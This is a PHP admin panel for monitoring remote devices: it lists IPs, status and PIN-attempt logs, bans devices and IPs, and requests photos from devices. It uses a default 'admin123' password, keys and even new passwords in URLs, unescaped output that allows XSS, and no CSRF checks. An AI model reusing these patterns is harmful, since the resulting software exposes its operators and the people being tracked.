<?php
function hashPassword($password) {
    return hash('sha256', $password . 'saltysalt123');
}

$configFile = __DIR__ . '/.admin_config.json';
$config = file_exists($configFile) ? json_decode(file_get_contents($configFile), true) : [];

if (!isset($config['password_hash'])) {
    $config['password_hash'] = hashPassword('admin123');
}
if (!isset($config['licence_pin'])) {
    $config['licence_pin'] = '4575';
}
file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));

$adminPasswordHash = $config['password_hash'];
$licencePin = $config['licence_pin'];

$key = $_GET['key'] ?? '';
if (hashPassword($key) !== $adminPasswordHash) {
    http_response_code(401);
    die("Unauthorized");
}

$stateFile = __DIR__ . '/latest_state.json';
$bannedFile = __DIR__ . '/banned_devices.txt';
$bannedIpsFile = __DIR__ . '/banned_ips.txt';
$visitsLog = __DIR__ . '/visits.log';

$action = $_GET['action'] ?? $_POST['action'] ?? '';
$device = $_GET['device'] ?? $_POST['device'] ?? '';
$ip_to_ban = $_GET['ip'] ?? $_POST['ip'] ?? '';
$section = $_GET['section'] ?? '';

if ($action === 'change_password') {
    $oldPass = $_POST['old_password'] ?? '';
    $newPass = $_POST['new_password'] ?? '';
    $confirmPass = $_POST['confirm_password'] ?? '';
    if (hashPassword($oldPass) === $adminPasswordHash) {
        if ($newPass === $confirmPass && !empty($newPass)) {
            $config['password_hash'] = hashPassword($newPass);
            file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
            header("Location: admin.php?key=" . urlencode($newPass) . "&section=passwords&msg=password_changed");
            exit;
        }
    }
}

if ($action === 'change_licence_pin') {
    $oldPin = $_POST['old_pin'] ?? '';
    $newPin = $_POST['new_pin'] ?? '';
    $confirmPin = $_POST['confirm_pin'] ?? '';
    if ($oldPin === $licencePin) {
        if ($newPin === $confirmPin && !empty($newPin) && strlen($newPin) === 4 && ctype_digit($newPin)) {
            $config['licence_pin'] = $newPin;
            file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
            header("Location: admin.php?key=" . urlencode($key) . "&section=passwords&msg=pin_changed");
            exit;
        }
    }
}

if ($action === 'request_photo' && $device) {
    $state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
    if (isset($state[$device])) {
        $state[$device]['request_photo'] = true;
        file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
        header("Location: admin.php?key=" . urlencode($key) . "&device=" . urlencode($device) . "&msg=photo_requested");
        exit;
    }
}

if ($action && ($device || $ip_to_ban) && !in_array($action, ['change_password', 'change_licence_pin', 'request_photo'])) {
    if ($action === 'ban') {
        $bannedDevices = file_exists($bannedFile) ? file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        $bannedDevices = array_map('trim', $bannedDevices);
        if (!in_array($device, $bannedDevices, true)) {
            $bannedDevices[] = $device;
            file_put_contents($bannedFile, implode("\n", $bannedDevices) . "\n");
        }
    } elseif ($action === 'unban') {
        if (file_exists($bannedFile)) {
            $bannedDevices = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $bannedDevices = array_filter(array_map('trim', $bannedDevices), fn($d) => $d !== $device);
            file_put_contents($bannedFile, implode("\n", $bannedDevices) . "\n");
        }
    } elseif ($action === 'ban_ip') {
        $bannedIps = file_exists($bannedIpsFile) ? file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        if (!in_array($ip_to_ban, array_map('trim', $bannedIps), true)) {
            $bannedIps[] = $ip_to_ban;
            file_put_contents($bannedIpsFile, implode("\n", $bannedIps) . "\n");
        }
    } elseif ($action === 'unban_ip') {
        if (file_exists($bannedIpsFile)) {
            $bannedIps = file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $bannedIps = array_filter(array_map('trim', $bannedIps), fn($i) => $i !== $ip_to_ban);
            file_put_contents($bannedIpsFile, implode("\n", $bannedIps) . "\n");
        }
    }
    header("Location: admin.php?key=" . urlencode($key) . ($device ? "&device=".urlencode($device) : ($section ? "&section=$section" : "")));
    exit;
}

$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
$bannedDevices = file_exists($bannedFile) ? array_map('trim', file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) : [];
$bannedIps = file_exists($bannedIpsFile) ? array_map('trim', file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) : [];

$visits = [];
if (file_exists($visitsLog)) {
    foreach (file($visitsLog, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if ($v = json_decode($line, true)) $visits[] = $v;
    }
}
$visits = array_reverse($visits);

function getDevicePhoto($deviceId) {
    $path = "photos/{$deviceId}.jpg";
    if (file_exists(__DIR__ . '/' . $path)) {
        return $path . '?t=' . filemtime(__DIR__ . '/' . $path);
    }
    return null;
}

function getDeviceStatus($deviceId, $state, $visits) {
    global $bannedDevices, $bannedIps;
    if (in_array($deviceId, $bannedDevices, true)) return 'banned';
    $ip = $state[$deviceId]['ip'] ?? '';
    if ($ip && in_array($ip, $bannedIps, true)) return 'banned';
    $lastSeen = $state[$deviceId]['last_seen'] ?? '';
    if (!$lastSeen) return 'offline';
    if (time() - strtotime($lastSeen) <= 300) {
        $lastEvent = 'unknown';
        foreach ($visits as $v) { if (($v['deviceId']??'') === $deviceId) { $lastEvent = $v['event']??''; break; } }
        if (in_array($lastEvent, ['app_hidden', 'app_pagehide', 'app_beforeunload'])) return 'offline';
        return 'active';
    }
    return 'offline';
}

$viewDevice = $_GET['device'] ?? '';
$isProfileView = !empty($viewDevice) && isset($state[$viewDevice]);
$isPasswordView = $section === 'passwords';
$isBannedView = $section === 'banned';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Panel</title>
    <style>
        :root { --primary: #007aff; --danger: #ff3b30; --success: #34c759; --warning: #ff9500; --bg: #f2f2f7; --card-bg: #ffffff; --text: #1c1c1e; --text-secondary: #8e8e93; --border: #e5e5ea; --radius: 12px; }
        body { font-family: -apple-system, system-ui, sans-serif; margin: 0; background: var(--bg); color: var(--text); }
        .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .btn { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-size: 13px; font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-danger { background: var(--danger); color: white; }
        .btn-success { background: var(--success); color: white; }
        .btn-warning { background: var(--warning); color: white; }
        .btn-outline { background: transparent; border: 1.5px solid var(--border); color: var(--text); }
        .btn-sm { padding: 5px 12px; font-size: 12px; }
        .badge { padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; background: #e5e5ea; color: var(--text-secondary); }
        .badge-banned { background: #000; color: #fff; }
        .badge-success { background: var(--success); color: #fff; }
        .stats-bar { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-card { background: var(--card-bg); border-radius: var(--radius); padding: 14px 18px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); flex: 1; min-width: 100px; }
        .stat-card .num { font-size: 28px; font-weight: 700; }
        .stat-card .label { font-size: 12px; color: var(--text-secondary); }
        .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 14px; }
        .device-card { background: var(--card-bg); border-radius: var(--radius); padding: 14px; display: flex; align-items: center; gap: 14px; text-decoration: none; color: inherit; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
        .device-card .photo-thumb { width: 56px; height: 56px; border-radius: 10px; object-fit: cover; background: #e5e5ea; }
        .profile-header { background: var(--card-bg); border-radius: var(--radius); padding: 24px; display: flex; gap: 24px; flex-wrap: wrap; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
        .profile-header .large-photo { width: 160px; height: 200px; border-radius: 10px; object-fit: cover; background: #e5e5ea; }
        .admin-table { width: 100%; border-collapse: collapse; }
        .admin-table th, .admin-table td { text-align: left; padding: 12px; border-bottom: 1px solid var(--border); }
        .timeline { padding: 10px; }
        .event-item { padding: 10px; border-left: 2px solid var(--border); margin-left: 10px; position: relative; }
        .event-badge { padding: 2px 8px; border-radius: 4px; font-size: 10px; color: white; background: #8e8e93; }
        .event-badge.pin_success { background: var(--success); }
        .event-badge.pin_failed { background: var(--danger); }
        .password-form { background: var(--card-bg); border-radius: var(--radius); padding: 20px; margin-bottom: 20px; }
        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 4px; }
        .form-group input { width: 100%; padding: 10px; border: 1px solid var(--border); border-radius: 6px; }
    </style>
</head>
<body>
    <div class="container">
    <?php if ($isProfileView): 
        $d = $state[$viewDevice];
        $isB = in_array($viewDevice, $bannedDevices, true);
        $photo = getDevicePhoto($viewDevice);
        $reqPending = !empty($d['request_photo']);
    ?>
        <a href="admin.php?key=<?=htmlspecialchars($key)?>" style="text-decoration:none;color:var(--primary);">← Back</a>
        <div class="profile-header">
            <?php if ($photo): ?>
                <img src="<?=$photo?>" class="large-photo">
            <?php else: ?>
                <div class="large-photo" style="display:flex;align-items:center;justify-content:center;background:#eee;">No Photo</div>
            <?php endif; ?>
            <div style="flex:1;">
                <h2><?=htmlspecialchars($d['name']??'Unknown')?></h2>
                <p>ID: <?=htmlspecialchars($viewDevice)?></p>
                <p>IP: <?=htmlspecialchars($d['ip']??'—')?></p>
                <p>Status: <?=getDeviceStatus($viewDevice, $state, $visits)?></p>
                <p>Photo Status: <?=$photo ? '<span class="badge badge-success">HAS PHOTO</span>' : '<span class="badge">NO PHOTO</span>'?></p>
                <div style="display:flex;gap:10px;margin-top:20px;flex-wrap:wrap;">
                    <?php if ($isB): ?>
                        <a href="admin.php?key=<?=urlencode($key)?>&device=<?=urlencode($viewDevice)?>&action=unban" class="btn btn-success">Unban Device</a>
                    <?php else: ?>
                        <a href="admin.php?key=<?=urlencode($key)?>&device=<?=urlencode($viewDevice)?>&action=ban" class="btn btn-danger">Ban Device</a>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <input type="hidden" name="action" value="request_photo">
                        <button type="submit" class="btn btn-primary" <?=$reqPending?'disabled':''?>>
                            <?=$reqPending ? '⌛ Photo Requested...' : '📷 Request Current Photo'?>
                        </button>
                    </form>
                </div>
            </div>
        </div>
        <div class="stat-card" style="margin-bottom:20px;">
            <h3>Event History</h3>
            <div class="timeline">
                <?php foreach ($visits as $v): if(($v['deviceId']??'')===$viewDevice): ?>
                    <div class="event-item">
                        <div style="font-size:11px;color:var(--text-secondary);"><?=$v['timestamp']?></div>
                        <span class="event-badge <?=$v['event']?>"><?=$v['event']?></span>
                        <?php if(!empty($v['pin_attempt']) && $v['pin_attempt']!=='—'): ?> (<?=$v['pin_attempt']?>)<?php endif; ?>
                        <?php if(!empty($v['photoChanged'])): ?> <span class="badge badge-success">Photo Received</span><?php endif; ?>
                    </div>
                <?php endif; endforeach; ?>
            </div>
        </div>

    <?php elseif ($isPasswordView): ?>
        <header><h1>Passwords</h1><a href="admin.php?key=<?=htmlspecialchars($key)?>" class="btn btn-outline">Dashboard</a></header>
        <div class="password-form">
            <h3>Change Admin Password</h3>
            <form method="POST">
                <input type="hidden" name="action" value="change_password">
                <div class="form-group"><label>Current Password</label><input type="password" name="old_password"></div>
                <div class="form-group"><label>New Password</label><input type="password" name="new_password"></div>
                <div class="form-group"><label>Confirm</label><input type="password" name="confirm_password"></div>
                <button type="submit" class="btn btn-primary">Change Password</button>
            </form>
        </div>
        <div class="password-form">
            <h3>Change Licence PIN</h3>
            <form method="POST">
                <input type="hidden" name="action" value="change_licence_pin">
                <div class="form-group"><label>Current PIN</label><input type="password" name="old_pin"></div>
                <div class="form-group"><label>New PIN</label><input type="password" name="new_pin"></div>
                <div class="form-group"><label>Confirm</label><input type="password" name="confirm_pin"></div>
                <button type="submit" class="btn btn-warning">Change PIN</button>
            </form>
        </div>

    <?php elseif ($isBannedView): ?>
        <header><h1>Banned Mgmt</h1><a href="admin.php?key=<?=htmlspecialchars($key)?>" class="btn btn-outline">Dashboard</a></header>
        <div class="stat-card">
            <h3>Banned Devices</h3>
            <table class="admin-table">
                <?php foreach($bannedDevices as $bd): ?>
                    <tr><td><?=$bd?></td><td><a href="admin.php?key=<?=urlencode($key)?>&section=banned&device=<?=urlencode($bd)?>&action=unban" class="btn btn-success btn-sm">Unban</a></td></tr>
                <?php endforeach; ?>
            </table>
        </div>

    <?php else: ?>
        <header>
            <h1>Dashboard</h1>
            <div>
                <a href="admin.php?key=<?=htmlspecialchars($key)?>&section=banned" class="btn btn-danger btn-sm">Banned</a>
                <a href="admin.php?key=<?=htmlspecialchars($key)?>&section=passwords" class="btn btn-warning btn-sm">Passwords</a>
                <a href="admin.php?key=<?=htmlspecialchars($key)?>" class="btn btn-primary btn-sm">Refresh</a>
            </div>
        </header>
        <div class="stats-bar">
            <div class="stat-card"><div class="num"><?=count($state)?></div><div class="label">Devices</div></div>
            <div class="stat-card"><div class="num"><?=count($bannedDevices)?></div><div class="label">Banned</div></div>
        </div>
        <div class="device-grid">
            <?php foreach ($state as $id => $d): 
                $status = getDeviceStatus($id, $state, $visits);
                $photo = getDevicePhoto($id);
            ?>
                <a href="admin.php?key=<?=htmlspecialchars($key)?>&device=<?=urlencode($id)?>" class="device-card" style="<?=$status==='banned'?'opacity:0.5':''?>">
                    <img src="<?=$photo ?: 'https://via.placeholder.com/60'?>" class="photo-thumb">
                    <div style="flex:1;">
                        <div style="font-weight:700;"><?=htmlspecialchars($d['name']??'Unknown')?></div>
                        <div style="font-size:11px;color:var(--text-secondary);"><?=substr($id, 0, 10)?>...</div>
                    </div>
                    <span class="badge" style="background:<?=$status==='active'? 'var(--success)' : ($status==='banned'?'#000':'#ccc')?>;color:#fff;"><?=$status?></span>
                </a>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>
    </div>
</body>
</html>
